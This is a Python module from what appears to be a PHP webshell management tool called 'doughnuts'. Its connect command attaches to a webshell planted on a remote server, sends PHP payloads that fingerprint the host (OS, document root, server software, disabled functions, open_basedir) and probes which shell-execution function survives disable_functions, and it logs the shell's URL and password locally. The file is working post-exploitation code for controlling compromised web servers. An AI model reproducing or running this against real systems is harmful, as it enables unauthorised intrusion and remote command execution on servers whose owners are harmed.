from os import path, SEEK_END
from urllib.parse import urlparse, parse_qs

from libs.config import alias, color, gget, gset, set_namespace
from libs.app import value_translation
from libs.myapp import is_windows, print_webshell_info, send, prepare_system_template

"""
url ['webshell']
webshell.params_dict ['webshell']
webshell.password ['webshell']
webshell.method ['webshell']
webshell.encode_functions ['webshell']  Encoder(s) used by webshell
webshell.disable_functions ['webshell']
webshell.netloc ['webshell']
webshell.download_path ['webshell']
webshell.os_version ['webshell']
webshell.php_version ['webshell']
webshell.root ['webshell']
webshell.v7 ['webshell'] Whether is php7
webshell.iswin ['webshell'] Whether is windows
webshell.upload_tmp_dir ['webshell']
webshell.from_log ['webshell'] Whether connect from log
"""


def get_detectd_exec_php():
    return """$a=array('system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'popen');
$disabled = explode(',', ini_get('disable_functions'));
foreach ($a as $v){
    if (function_exists($v) && !in_array($v, $disabled)){
        echo $v;
        break;
    }
}"""


@alias(True, "c", u="url", m="method", p="pwd")
def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
    """
    connect

    Connect a webshell of php.

    eg: connect {url} {method} {pass} {encoders_or_params...}
    """
    method = str(method).upper()
    params_dict = {"headers": {}}
    if method == "GET":
        raw_key = "params"
    elif method == "POST":
        raw_key = "data"
    elif method == "COOKIE":
        raw_key = "cookies"
    elif method == "HEADER":
        raw_key = "headers"
    else:
        print(color.red("Method error"))
        return
    if (is_windows(False)):
        new_eop = []
        extra_params = []
        pass_next = False
        eop_len = len(encoders_or_params)
        for i in range(eop_len):  # 清洗数据,解决windows下a=b传成2个参数的错误
            v = str(encoders_or_params[i])
            if (pass_next):
                pass_next = False
                continue
            if (":" not in v):
                new_eop.append(str(v))
            elif (i < eop_len - 1):
                extra_params.append(v + "=" + str(encoders_or_params[i+1]))
                pass_next = True
        encoders_or_params = new_eop
    extra_params = [f for f in encoders_or_params if "=" in str(f)]
    params_dict[raw_key] = {}
    for each in extra_params:
        if(":" in each):
            k, data = each.split(":")
            if (k not in params_dict):
                params_dict[k] = {}
            params_dict[k].update(dict([(k, value_translation(v[0]))
                                        for k, v in parse_qs(data).items()]))
        else:
            k, data = each.split("=")
            if (k not in params_dict):
                params_dict[k] = {}
            if (k == "auth"):
                params_dict[k] = value_translation(data)
    webshell_netloc = urlparse(url).netloc
    gset("webshell.url", url, namespace="webshell")
    gset("webshell.params_dict", params_dict, namespace="webshell")
    gset("webshell.password", str(pwd), namespace="webshell")
    gset("webshell.method", raw_key, namespace="webshell")
    gset("webshell.encode_functions", encoders_or_params, namespace="webshell")
    gset("webshell.netloc", webshell_netloc, namespace="webshell")
    gset(
        "webshell.download_path",
        path.join(gget("root_path"), "target",
                  webshell_netloc.replace(":", "_")),
        namespace="webshell",
    )
    gset("webshell.pwd", ".", namespace="webshell")
    gset("webshell.bypass_df", -1, namespace="webshell")
    res = send(
        'print("c4ca4238a0b923820d|".phpversion()."|cc509a6f75849b");', raw=True)
    if (not res or "c4ca4238a0b923820d" not in res.r_text):
        print(color.red("Connect failed..."))
        if (res):
            print(res.r_text)
        return False
    if ('7.' in res.r_text):
        gset("webshell.v7", True, namespace="webshell")
    if "c4ca4238a0b923820d" in res.r_text:  # 验证是否成功连接
        gset("webshell.php_version", res.r_text.split("c4ca4238a0b923820d|")[
             1].split("|cc509a6f75849b")[0], namespace="webshell")
        info_req = send(
            """print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions').'|'.ini_get('open_basedir'));"""
        )
        info = info_req.r_text.strip().split("|")
        exec_func = send(get_detectd_exec_php()).r_text.strip()
        prepare_system_template(exec_func)
        gset("webshell.root", info[0], namespace="webshell")
        gset("webshell.os_version", info[1], namespace="webshell")
        gset(
            "webshell.iswin",
            (True if "win" in info[1].lower() else False),
            namespace="webshell",
        )
        gset("webshell.server_version", info[2], namespace="webshell")
        gset("webshell.pwd", info[3], namespace="webshell")
        gset("webshell.prompt",
             f"doughnuts ({color.cyan(webshell_netloc)}) > ")
        gset("webshell.exec_func", exec_func, namespace="webshell")
        upload_tmp_dir = info[4]
        if (not upload_tmp_dir):
            if (not is_windows()):
                upload_tmp_dir = "/tmp/"
        else:
            if (is_windows()):
                upload_tmp_dir += "\\\\"
            else:
                upload_tmp_dir += "/"
        gset("webshell.upload_tmp_dir", upload_tmp_dir, namespace="webshell")
        disable_function_list = [f.strip() for f in info[5].split(",")]
        if ('' in disable_function_list):
            disable_function_list.remove('')
        gset("webshell.obd", info[6], namespace="webshell")
        gset("webshell.disable_functions",
             disable_function_list, namespace="webshell")
        root_path = gget("root_path")
        from_log = gget("webshell.from_log", "webshell")
        if not from_log:
            extra = "|".join(encoders_or_params) + \
                "|" if encoders_or_params else ""
            with open(path.join(root_path, "webshell.log"), "ab+") as f:
                text = f.read()
                if (text):
                    f.seek(-1, SEEK_END)
                    if f.read(1) != b"\n":
                        f.write(b"\n")
                f.write(f"{url}|{method}|{pwd}|{extra}\n".encode())
        else:
            gset("webshell.from_log", False, True, "webshell")
        print(color.cyan("Connect success...\n"))
        print_webshell_info()
        set_namespace("webshell", callback=False)
        if (exec_func == ''):
            print(color.red("No system execute function\n"))
        return True
